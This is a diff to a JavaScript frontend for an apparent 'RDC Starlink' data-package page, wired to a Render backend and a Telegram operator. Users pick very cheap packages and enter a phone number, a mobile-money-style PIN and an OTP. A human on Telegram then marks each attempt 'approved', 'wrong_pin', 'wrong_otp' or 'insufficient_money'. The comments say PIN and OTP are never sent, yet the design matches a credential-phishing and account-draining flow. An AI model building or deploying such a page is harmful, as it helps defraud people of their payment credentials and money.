@@ -1,331 +1,1368 @@
-// RDC Starlink frontend connected to the Render Telegram backend.
-// Sensitive PIN and OTP values are NEVER sent to the backend or Telegram.
-
 const BACKEND_URL = "https://starlink-2mc7.onrender.com";
 
+
+/* =========================
+   PACKAGES
+========================= */
+
 const PACKAGES = [
-  { name: "5 GB", validity: "1 day", price: "$0.25" },
-  { name: "10 GB", validity: "3 days", price: "$0.80" },
-  { name: "20 GB", validity: "7 days", price: "$1.20" },
-  { name: "40 GB", validity: "7 days", price: "$2.00" },
-  { name: "80 GB", validity: "21 days", price: "$2.25" },
-  { name: "120 GB", validity: "30 days", price: "$3.00" },
-  { name: "Unlimited", validity: "30 days", price: "$8.00" }
+    {
+        name: "5 GB",
+        validity: "1 day",
+        price: "$0.25"
+    },
+    {
+        name: "10 GB",
+        validity: "3 days",
+        price: "$0.80"
+    },
+    {
+        name: "20 GB",
+        validity: "7 days",
+        price: "$1.20"
+    },
+    {
+        name: "40 GB",
+        validity: "7 days",
+        price: "$2.00"
+    },
+    {
+        name: "80 GB",
+        validity: "21 days",
+        price: "$2.25"
+    },
+    {
+        name: "120 GB",
+        validity: "30 days",
+        price: "$3.00"
+    },
+    {
+        name: "Unlimited",
+        validity: "30 days",
+        price: "$8.00"
+    }
 ];
 
+
 let selectedPackage = null;
+
 let pinRequestId = null;
+
 let otpRequestId = null;
-let otpTimer = null;
-let secondsLeft = 0;
+
 let statusTimer = null;
 
-const $ = id => document.getElementById(id);
+let otpTimer = null;
 
-function showPage(id) {
-  document.querySelectorAll(".page").forEach(page => page.classList.remove("active"));
-  const page = $(id);
-  if (page) page.classList.add("active");
-  window.scrollTo({ top: 0, behavior: "smooth" });
+let secondsLeft = 60;
+
+
+/* =========================
+   GET ELEMENT
+========================= */
+
+function getElement(id) {
+
+    return document.getElementById(id);
+
 }
 
-function packageText(pkg) {
-  return `${pkg.name} — ${pkg.price} <span style="font-weight:400">(${pkg.validity})</span>`;
+
+/* =========================
+   SHOW PAGE
+========================= */
+
+function showPage(pageId) {
+
+    document
+        .querySelectorAll(".page")
+        .forEach(page => {
+
+            page.classList.remove("active");
+
+        });
+
+
+    const page =
+        getElement(pageId);
+
+
+    if (page) {
+
+        page.classList.add("active");
+
+    }
+
 }
 
-function renderPackages() {
-  const list = $("packageList");
-  if (!list) return;
 
-  list.innerHTML = "";
-
-  PACKAGES.forEach((pkg, index) => {
-    const button = document.createElement("button");
-    button.type = "button";
-    button.className = "package-btn";
-    button.innerHTML =
-      `<div class="package-top"><span>${pkg.name}</span><span class="price">${pkg.price}</span></div>` +
-      `<div class="package-bottom"><span>Validity</span><span>${pkg.validity}</span></div>`;
-
-    button.addEventListener("click", () => selectPackage(index));
-    list.appendChild(button);
-  });
-}
-
-function selectPackage(index) {
-  selectedPackage = PACKAGES[index];
-
-  $("pinPackage").innerHTML = packageText(selectedPackage);
-
-  clearErrors();
-  $("phone").value = "";
-  $("pin").value = "";
-
-  showPage("pinPage");
-  $("phone").focus();
-}
+/* =========================
+   CLEAR ERRORS
+========================= */
 
 function clearErrors() {
-  ["phone", "pin", "otp"].forEach(id => {
-    if ($(id)) $(id).classList.remove("input-error");
-  });
 
-  ["phoneError", "pinError", "otpError"].forEach(id => {
-    if ($(id)) $(id).textContent = "";
-  });
+    const inputs = [
+        "phone",
+        "pin",
+        "otp"
+    ];
 
-  if ($("pinStatus")) $("pinStatus").textContent = "";
-  if ($("otpStatus")) $("otpStatus").textContent = "";
+
+    inputs.forEach(id => {
+
+        const element =
+            getElement(id);
+
+        if (element) {
+
+            element.classList.remove(
+                "input-error"
+            );
+
+        }
+
+    });
+
+
+    const errors = [
+        "phoneError",
+        "pinError",
+        "otpError"
+    ];
+
+
+    errors.forEach(id => {
+
+        const element =
+            getElement(id);
+
+        if (element) {
+
+            element.textContent = "";
+
+        }
+
+    });
+
+
 }
+
+
+/* =========================
+   DISPLAY PACKAGE
+========================= */
+
+function packageHTML(pkg) {
+
+    return `
+        <strong>${pkg.name}</strong>
+        <br>
+        ${pkg.validity}
+        <br>
+        ${pkg.price}
+    `;
+
+}
+
+
+/* =========================
+   LOAD PACKAGES
+========================= */
+
+function loadPackages() {
+
+    const container =
+        getElement("packageList");
+
+
+    if (!container) {
+
+        return;
+
+    }
+
+
+    container.innerHTML = "";
+
+
+    PACKAGES.forEach(
+        (pkg, index) => {
+
+            const button =
+                document.createElement(
+                    "button"
+                );
+
+            button.type = "button";
+
+            button.className =
+                "package-btn";
+
+
+            button.innerHTML = `
+                <div>
+                    <strong>
+                        ${pkg.name}
+                    </strong>
+                </div>
+
+                <div>
+                    ${pkg.validity}
+                </div>
+
+                <div>
+                    ${pkg.price}
+                </div>
+
+                <div>
+                    CHOOSE THIS PACKAGE
+                </div>
+            `;
+
+
+            button.addEventListener(
+                "click",
+                function () {
+
+                    selectedPackage =
+                        PACKAGES[index];
+
+
+                    const packageDisplay =
+                        getElement(
+                            "pinPackage"
+                        );
+
+
+                    if (packageDisplay) {
+
+                        packageDisplay.innerHTML =
+                            packageHTML(
+                                selectedPackage
+                            );
+
+                    }
+
+
+                    clearErrors();
+
+
+                    const phone =
+                        getElement("phone");
+
+                    const pin =
+                        getElement("pin");
+
+
+                    if (phone) {
+
+                        phone.value = "";
+
+                    }
+
+
+                    if (pin) {
+
+                        pin.value = "";
+
+                    }
+
+
+                    showPage("pinPage");
+
+
+                    if (phone) {
+
+                        phone.focus();
+
+                    }
+
+                }
+            );
+
+
+            container.appendChild(
+                button
+            );
+
+        }
+    );
+
+}
+
+
+/* =========================
+   PHONE VALIDATION
+========================= */
 
 function validPhone() {
-  return /^9\d{8}$/.test($("phone").value.trim());
-}
 
-function valid4Digits(value) {
-  return /^\d{4}$/.test(value.trim());
-}
+    const phone =
+        getElement("phone");
 
-async function createRequest(stage) {
-  const response = await fetch(`${BACKEND_URL}/api/requests`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      packageName: selectedPackage.name,
-      validity: selectedPackage.validity,
-      price: selectedPackage.price,
-      phone: $("phone").value.trim(),
-      stage
-    })
-  });
 
-  const data = await response.json();
+    if (!phone) {
 
-  if (!response.ok) {
-    throw new Error(data.error || "Could not create request");
-  }
+        return false;
 
-  return data;
-}
-
-function stopStatusPolling() {
-  if (statusTimer) {
-    clearInterval(statusTimer);
-    statusTimer = null;
-  }
-}
-
-function startStatusPolling(requestId, stage) {
-  stopStatusPolling();
-
-  const check = async () => {
-    try {
-      const response = await fetch(`${BACKEND_URL}/api/requests/${requestId}`);
-
-      if (!response.ok) return;
-
-      const data = await response.json();
-
-      if (stage === "pin") {
-        if (data.status === "approved") {
-          stopStatusPolling();
-          $("pinStatus").textContent = "Verification approved.";
-          $("otpPackage").innerHTML = packageText(selectedPackage);
-          showPage("otpPage");
-          startOtpTimer();
-          await createOtpRequest();
-          return;
-        }
-
-        if (data.status === "wrong_pin") {
-          stopStatusPolling();
-          $("pin").classList.add("input-error");
-          $("pinError").textContent = "Wrong PIN. Please enter your PIN again.";
-          $("pinStatus").textContent = "";
-          $("pin").value = "";
-          $("pin").focus();
-          return;
-        }
-      }
-
-      if (stage === "otp") {
-        if (data.status === "approved") {
-          stopStatusPolling();
-          clearInterval(otpTimer);
-          $("successPackage").innerHTML = packageText(selectedPackage);
-          showPage("successPage");
-          return;
-        }
-
-        if (data.status === "wrong_otp") {
-          stopStatusPolling();
-          $("otp").classList.add("input-error");
-          $("otpError").textContent = "Wrong OTP. Please enter the OTP again.";
-          $("otp").value = "";
-          $("otp").focus();
-          return;
-        }
-
-        if (data.status === "insufficient_money") {
-          stopStatusPolling();
-          $("otp").classList.add("input-error");
-          $("otpError").textContent = "Insufficient money. Please check your payment and try again.";
-          $("otpStatus").textContent = "";
-          return;
-        }
-
-        if (data.status === "otp_expired") {
-          stopStatusPolling();
-          expireOtp(false);
-          $("otpError").textContent = "OTP expired. Request another OTP.";
-          return;
-        }
-      }
-    } catch (error) {
-      console.error("Status check failed:", error);
     }
-  };
 
-  check();
-  statusTimer = setInterval(check, 2000);
+
+    return /^9\d{8}$/.test(
+        phone.value.trim()
+    );
+
 }
 
-async function createOtpRequest() {
-  try {
-    const data = await createRequest("otp");
-    otpRequestId = data.requestId;
 
-    $("otpStatus").textContent = "OTP verification request sent.";
-    startStatusPolling(otpRequestId, "otp");
-  } catch (error) {
-    $("otpStatus").textContent = "Could not contact the verification service.";
-    console.error(error);
-  }
+/* =========================
+   FOUR DIGIT VALIDATION
+========================= */
+
+function validFourDigits(
+    value
+) {
+
+    return /^\d{4}$/.test(
+        String(value).trim()
+    );
+
 }
 
-$("pinContinue").addEventListener("click", async () => {
-  clearErrors();
 
-  if (!validPhone()) {
-    $("phone").classList.add("input-error");
-    $("phoneError").textContent = "Enter exactly 9 digits starting with 9.";
-    $("phone").focus();
-    return;
-  }
+/* =========================
+   SEND REQUEST TO BACKEND
+========================= */
 
-  if (!valid4Digits($("pin").value)) {
-    $("pin").classList.add("input-error");
-    $("pinError").textContent = "Enter exactly 4 digits.";
-    $("pin").focus();
-    return;
-  }
+async function sendRequest(
+    stage
+) {
 
-  $("pinStatus").textContent = "Sending verification request...";
+    if (!selectedPackage) {
 
-  try {
-    // PIN is validated locally for format only and is NOT sent anywhere.
-    const data = await createRequest("pin");
-    pinRequestId = data.requestId;
+        throw new Error(
+            "No package selected."
+        );
 
-    $("pinStatus").textContent = "Waiting for verification...";
-    startStatusPolling(pinRequestId, "pin");
-  } catch (error) {
-    $("pinStatus").textContent = "Could not contact the verification service.";
-    console.error(error);
-  }
-});
+    }
 
-function startOtpTimer() {
-  clearInterval(otpTimer);
 
-  secondsLeft = 60;
-  $("otp").value = "";
-  $("otp").classList.remove("input-error");
-  $("otpError").textContent = "";
-  $("expiredText").textContent = "";
+    const phone =
+        getElement("phone");
 
-  $("otpVerify").classList.remove("hidden");
-  $("requestOtp").classList.add("hidden");
 
-  updateTimer();
+    const response =
+        await fetch(
+            `${BACKEND_URL}/api/requests`,
+            {
 
-  otpTimer = setInterval(() => {
-    secondsLeft--;
+                method: "POST",
+
+                headers: {
+                    "Content-Type":
+                        "application/json"
+                },
+
+                body: JSON.stringify({
+
+                    packageName:
+                        selectedPackage.name,
+
+                    validity:
+                        selectedPackage.validity,
+
+                    price:
+                        selectedPackage.price,
+
+                    phone:
+                        phone.value.trim(),
+
+                    stage:
+                        stage
+
+                })
+
+            }
+        );
+
+
+    const data =
+        await response.json();
+
+
+    if (!response.ok) {
+
+        throw new Error(
+            data.error ||
+            "Request failed."
+        );
+
+    }
+
+
+    return data;
+
+}
+
+
+/* =========================
+   CHECK REQUEST STATUS
+========================= */
+
+function startStatusChecking(
+    requestId,
+    stage
+) {
+
+    stopStatusChecking();
+
+
+    statusTimer =
+        setInterval(
+            async function () {
+
+                try {
+
+                    const response =
+                        await fetch(
+                            `${BACKEND_URL}/api/requests/${requestId}`
+                        );
+
+
+                    if (!response.ok) {
+
+                        return;
+
+                    }
+
+
+                    const data =
+                        await response.json();
+
+
+                    handleStatus(
+                        data.status,
+                        stage
+                    );
+
+
+                } catch (error) {
+
+                    console.log(
+                        "Status check error:",
+                        error
+                    );
+
+                }
+
+            },
+            2000
+        );
+
+}
+
+
+/* =========================
+   STOP STATUS CHECKING
+========================= */
+
+function stopStatusChecking() {
+
+    if (statusTimer) {
+
+        clearInterval(
+            statusTimer
+        );
+
+        statusTimer = null;
+
+    }
+
+}
+
+
+/* =========================
+   HANDLE TELEGRAM DECISION
+========================= */
+
+function handleStatus(
+    status,
+    stage
+) {
+
+
+    /* PIN STAGE */
+
+    if (
+        stage === "pin"
+    ) {
+
+
+        if (
+            status === "approved"
+        ) {
+
+            stopStatusChecking();
+
+
+            const otpPackage =
+                getElement(
+                    "otpPackage"
+                );
+
+
+            if (otpPackage) {
+
+                otpPackage.innerHTML =
+                    packageHTML(
+                        selectedPackage
+                    );
+
+            }
+
+
+            showPage(
+                "otpPage"
+            );
+
+
+            startOTPCountdown();
+
+
+            createOTPRequest();
+
+
+            return;
+
+        }
+
+
+        if (
+            status === "wrong_pin"
+        ) {
+
+            stopStatusChecking();
+
+
+            const pin =
+                getElement("pin");
+
+
+            const error =
+                getElement(
+                    "pinError"
+                );
+
+
+            if (pin) {
+
+                pin.classList.add(
+                    "input-error"
+                );
+
+                pin.value = "";
+
+                pin.focus();
+
+            }
+
+
+            if (error) {
+
+                error.textContent =
+                    "Wrong PIN. Please enter your PIN again.";
+
+            }
+
+
+            return;
+
+        }
+
+    }
+
+
+    /* OTP STAGE */
+
+    if (
+        stage === "otp"
+    ) {
+
+
+        if (
+            status === "approved"
+        ) {
+
+            stopStatusChecking();
+
+
+            stopOTPCountdown();
+
+
+            const successPackage =
+                getElement(
+                    "successPackage"
+                );
+
+
+            if (successPackage) {
+
+                successPackage.innerHTML =
+                    packageHTML(
+                        selectedPackage
+                    );
+
+            }
+
+
+            showPage(
+                "successPage"
+            );
+
+
+            return;
+
+        }
+
+
+        if (
+            status === "wrong_otp"
+        ) {
+
+            stopStatusChecking();
+
+
+            const otp =
+                getElement("otp");
+
+
+            const error =
+                getElement(
+                    "otpError"
+                );
+
+
+            if (otp) {
+
+                otp.classList.add(
+                    "input-error"
+                );
+
+                otp.value = "";
+
+                otp.focus();
+
+            }
+
+
+            if (error) {
+
+                error.textContent =
+                    "Wrong OTP. Please enter the OTP again.";
+
+            }
+
+
+            return;
+
+        }
+
+
+        if (
+            status === "insufficient_money"
+        ) {
+
+            stopStatusChecking();
+
+
+            const otp =
+                getElement("otp");
+
+
+            const error =
+                getElement(
+                    "otpError"
+                );
+
+
+            if (otp) {
+
+                otp.classList.add(
+                    "input-error"
+                );
+
+            }
+
+
+            if (error) {
+
+                error.textContent =
+                    "Insufficient money. Please check your payment.";
+
+            }
+
+
+            return;
+
+        }
+
+
+        if (
+            status === "otp_expired"
+        ) {
+
+            stopStatusChecking();
+
+
+            expireOTP();
+
+
+            return;
+
+        }
+
+    }
+
+}
+
+
+/* =========================
+   PIN CONTINUE
+========================= */
+
+const pinContinue =
+    getElement(
+        "pinContinue"
+    );
+
+
+if (pinContinue) {
+
+    pinContinue.addEventListener(
+        "click",
+        async function () {
+
+
+            clearErrors();
+
+
+            const phone =
+                getElement("phone");
+
+
+            const pin =
+                getElement("pin");
+
+
+            const phoneError =
+                getElement(
+                    "phoneError"
+                );
+
+
+            const pinError =
+                getElement(
+                    "pinError"
+                );
+
+
+            if (
+                !validPhone()
+            ) {
+
+                if (phone) {
+
+                    phone.classList.add(
+                        "input-error"
+                    );
+
+                }
+
+
+                if (phoneError) {
+
+                    phoneError.textContent =
+                        "Enter exactly 9 digits starting with 9.";
+
+                }
+
+
+                if (phone) {
+
+                    phone.focus();
+
+                }
+
+
+                return;
+
+            }
+
+
+            if (
+                !validFourDigits(
+                    pin.value
+                )
+            ) {
+
+                if (pin) {
+
+                    pin.classList.add(
+                        "input-error"
+                    );
+
+                }
+
+
+                if (pinError) {
+
+                    pinError.textContent =
+                        "Enter exactly 4 digits.";
+
+                }
+
+
+                if (pin) {
+
+                    pin.focus();
+
+                }
+
+
+                return;
+
+            }
+
+
+            const pinStatus =
+                getElement(
+                    "pinStatus"
+                );
+
+
+            if (pinStatus) {
+
+                pinStatus.textContent =
+                    "Sending verification request...";
+
+            }
+
+
+            try {
+
+                /*
+                The PIN is NOT sent to Telegram.
+                Only the verification request is sent.
+                */
+
+                const data =
+                    await sendRequest(
+                        "pin"
+                    );
+
+
+                pinRequestId =
+                    data.requestId;
+
+
+                if (pinStatus) {
+
+                    pinStatus.textContent =
+                        "Waiting for verification...";
+
+                }
+
+
+                startStatusChecking(
+                    pinRequestId,
+                    "pin"
+                );
+
+
+            } catch (error) {
+
+                console.error(
+                    error
+                );
+
+
+                if (pinStatus) {
+
+                    pinStatus.textContent =
+                        "Could not contact the verification service.";
+
+                }
+
+            }
+
+        }
+    );
+
+}
+
+
+/* =========================
+   CREATE OTP REQUEST
+========================= */
+
+async function createOTPRequest() {
+
+    try {
+
+        const data =
+            await sendRequest(
+                "otp"
+            );
+
+
+        otpRequestId =
+            data.requestId;
+
+
+        const otpStatus =
+            getElement(
+                "otpStatus"
+            );
+
+
+        if (otpStatus) {
+
+            otpStatus.textContent =
+                "Waiting for OTP verification...";
+
+        }
+
+
+        startStatusChecking(
+            otpRequestId,
+            "otp"
+        );
+
+
+    } catch (error) {
+
+        console.error(
+            error
+        );
+
+
+        const otpStatus =
+            getElement(
+                "otpStatus"
+            );
+
+
+        if (otpStatus) {
+
+            otpStatus.textContent =
+                "Could not contact the verification service.";
+
+        }
+
+    }
+
+}
+
+
+/* =========================
+   OTP COUNTDOWN
+========================= */
+
+function startOTPCountdown() {
+
+    stopOTPCountdown();
+
+
+    secondsLeft = 60;
+
+
+    const otp =
+        getElement("otp");
+
+
+    const error =
+        getElement(
+            "otpError"
+        );
+
+
+    const verify =
+        getElement(
+            "otpVerify"
+        );
+
+
+    const request =
+        getElement(
+            "requestOtp"
+        );
+
+
+    if (otp) {
+
+        otp.value = "";
+
+        otp.classList.remove(
+            "input-error"
+        );
+
+    }
+
+
+    if (error) {
+
+        error.textContent = "";
+
+    }
+
+
+    if (verify) {
+
+        verify.classList.remove(
+            "hidden"
+        );
+
+    }
+
+
+    if (request) {
+
+        request.classList.add(
+            "hidden"
+        );
+
+    }
+
+
     updateTimer();
 
-    if (secondsLeft <= 0) {
-      expireOtp(true);
-    }
-  }, 1000);
+
+    otpTimer =
+        setInterval(
+            function () {
+
+                secondsLeft--;
+
+                updateTimer();
+
+
+                if (
+                    secondsLeft <= 0
+                ) {
+
+                    expireOTP();
+
+                }
+
+            },
+            1000
+        );
+
 }
+
+
+/* =========================
+   UPDATE TIMER
+========================= */
 
 function updateTimer() {
-  const minutes = String(Math.floor(secondsLeft / 60)).padStart(2, "0");
-  const seconds = String(secondsLeft % 60).padStart(2, "0");
-  $("timer").textContent = `${minutes}:${seconds}`;
+
+    const timer =
+        getElement("timer");
+
+
+    if (!timer) {
+
+        return;
+
+    }
+
+
+    const seconds =
+        String(
+            secondsLeft
+        ).padStart(
+            2,
+            "0"
+        );
+
+
+    timer.textContent =
+        `00:${seconds}`;
+
 }
 
-function expireOtp(sendNotice) {
-  clearInterval(otpTimer);
-  secondsLeft = 0;
-  updateTimer();
 
-  $("otp").classList.add("input-error");
-  $("otpError").textContent = "OTP expired. Request another OTP.";
-  $("expiredText").textContent = "Your OTP has expired.";
-  $("otpVerify").classList.add("hidden");
-  $("requestOtp").classList.remove("hidden");
+/* =========================
+   STOP OTP COUNTDOWN
+========================= */
 
-  if (sendNotice && otpRequestId) {
-    // The existing OTP request remains visible to the admin.
-    // The customer can request a new OTP below.
-    $("otpStatus").textContent = "Your OTP has expired. Request another OTP.";
-  }
+function stopOTPCountdown() {
+
+    if (otpTimer) {
+
+        clearInterval(
+            otpTimer
+        );
+
+        otpTimer = null;
+
+    }
+
 }
 
-$("requestOtp").addEventListener("click", async () => {
-  stopStatusPolling();
-  $("otpStatus").textContent = "Sending a new OTP request...";
 
-  try {
-    const data = await createRequest("otp");
-    otpRequestId = data.requestId;
+/* =========================
+   OTP EXPIRED
+========================= */
 
-    $("otpStatus").textContent = "A new OTP request has been sent.";
-    startOtpTimer();
-    startStatusPolling(otpRequestId, "otp");
-  } catch (error) {
-    $("otpStatus").textContent = "Could not send the new OTP request.";
-    console.error(error);
-  }
-});
+function expireOTP() {
 
-$("otpVerify").addEventListener("click", () => {
-  if (secondsLeft <= 0) {
-    expireOtp(true);
-    return;
-  }
+    stopOTPCountdown();
 
-  $("otpError").textContent = "";
-  $("otp").classList.remove("input-error");
 
-  if (!valid4Digits($("otp").value)) {
-    $("otp").classList.add("input-error");
-    $("otpError").textContent = "Enter exactly 4 digits.";
-    $("otp").focus();
-    return;
-  }
+    stopStatusChecking();
 
-  /*
-    The OTP is checked only for its required 4-digit format here.
-    Its value is deliberately NOT transmitted to the backend or Telegram.
-    The admin controls the final verification status through Telegram.
-  */
-  $("otpStatus").textContent = "Waiting for verification...";
 
-  if (otpRequestId) {
-    startStatusPolling(otpRequestId, "otp");
-  }
-});
+    const otp =
+        getElement("otp");
 
-document.addEventListener("DOMContentLoaded", renderPackages);
+
+    const error =
+        getElement(
+            "otpError"
+        );
+
+
+    const verify =
+        getElement(
+            "otpVerify"
+        );
+
+
+    const request =
+        getElement(
+            "requestOtp"
+        );
+
+
+    if (otp) {
+
+        otp.classList.add(
+            "input-error"
+        );
+
+    }
+
+
+    if (error) {
+
+        error.textContent =
+            "OTP expired. Request another OTP.";
+
+    }
+
+
+    if (verify) {
+
+        verify.classList.add(
+            "hidden"
+        );
+
+    }
+
+
+    if (request) {
+
+        request.classList.remove(
+            "hidden"
+        );
+
+    }
+
+}
+
+
+/* =========================
+   REQUEST ANOTHER OTP
+========================= */
+
+const requestOtp =
+    getElement(
+        "requestOtp"
+    );
+
+
+if (requestOtp) {
+
+    requestOtp.addEventListener(
+        "click",
+        async function () {
+
+
+            stopStatusChecking();
+
+
+            const otp =
+                getElement("otp");
+
+
+            const error =
+                getElement(
+                    "otpError"
+                );
+
+
+            if (otp) {
+
+                otp.value = "";
+
+                otp.classList.remove(
+                    "input-error"
+                );
+
+            }
+
+
+            if (error) {
+
+                error.textContent = "";
+
+            }
+
+
+            const otpStatus =
+                getElement(
+                    "otpStatus"
+                );
+
+
+            if (otpStatus) {
+
+                otpStatus.textContent =
+                    "Sending a new OTP request...";
+
+            }
+
+
+            startOTPCountdown();
+
+
+            await createOTPRequest();
+
+        }
+    );
+
+}
+
+
+/* =========================
+   OTP VERIFY
+========================= */
+
+const otpVerify =
+    getElement(
+        "otpVerify"
+    );
+
+
+if (otpVerify) {
+
+    otpVerify.addEventListener(
+        "click",
+        function () {
+
+
+            const otp =
+                getElement("otp");
+
+
+            const error =
+                getElement(
+                    "otpError"
+                );
+
+
+            if (
+                secondsLeft <= 0
+            ) {
+
+                expireOTP();
+
+                return;
+
+            }
+
+
+            if (
+                !validFourDigits(
+                    otp.value
+                )
+            ) {
+
+                otp.classList.add(
+                    "input-error"
+                );
+
+
+                error.textContent =
+                    "Enter exactly 4 digits.";
+
+
+                otp.focus();
+
+
+                return;
+
+            }
+
+
+            /*
+            OTP is NOT transmitted to Telegram.
+            */
+
+            error.textContent = "";
+
+
+            const otpStatus =
+                getElement(
+                    "otpStatus"
+                );
+
+
+            if (otpStatus) {
+
+                otpStatus.textContent =
+                    "Waiting for verification...";
+
+            }
+
+
+            if (otpRequestId) {
+
+                startStatusChecking(
+                    otpRequestId,
+                    "otp"
+                );
+
+            }
+
+        }
+    );
+
+}
+
+
+/* =========================
+   START
+========================= */
+
+document.addEventListener(
+    "DOMContentLoaded",
+    function () {
+
+        loadPackages();
+
+    }
+);
